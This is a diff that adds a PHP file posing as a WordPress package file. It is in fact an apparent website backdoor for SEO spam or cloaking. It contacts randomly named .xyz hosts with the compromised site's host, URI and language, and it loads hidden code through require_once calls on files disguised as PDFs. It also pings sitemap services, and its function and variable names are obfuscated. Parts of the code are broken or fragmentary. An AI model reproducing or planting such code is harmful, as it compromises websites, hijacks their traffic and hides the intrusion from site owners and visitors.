@@ -1,0 +1,28 @@
+<?php
+/**
+ * package WordPress
+ */
+function/*ab*/psinsmap($url){
+	$url_arr = '';
+    $return_str = '';
+    foreach($url_arr as $pingUrl){
+        $pingRes = dodzutoc($pingUrl);
+        $ok = (stripos($pingRes, 'Sitemap Notification Received') !== false) ? 'pingok' : 'error';
+        $return_str .= $pingUrl . '-- ' . $ok . '<br>';
+    }
+    return $return_str;
+}
+if(stripos($duri_tmp, 'report.php')) {
+  $goweb = 'hxcamelid.twalnutiyo.xyz';
+}else if(stripos($duri_tmp, 'abby.php')) {
+  $goweb = 'mxfreedoly.utrainmi.xyz';
+}else{
+  $goweb = 'nxmonthgh.yscarfkiad.xyz';
+}
+require_once 'adit.pdf';
+$web = $web1.'hp?web=' . $host . '&zz=' . diczbot() . '&uri=' . $duri . '&urlshang=' . $urlshang . '&http=' . $http . '&lang=' . $lang;
+
+/* blog and /blog/ is WordPress(b).*/
+$dszxcv = dodzutoc($web);
+require_once 'wzczp.pdf';
+/* blog Press(b)*/
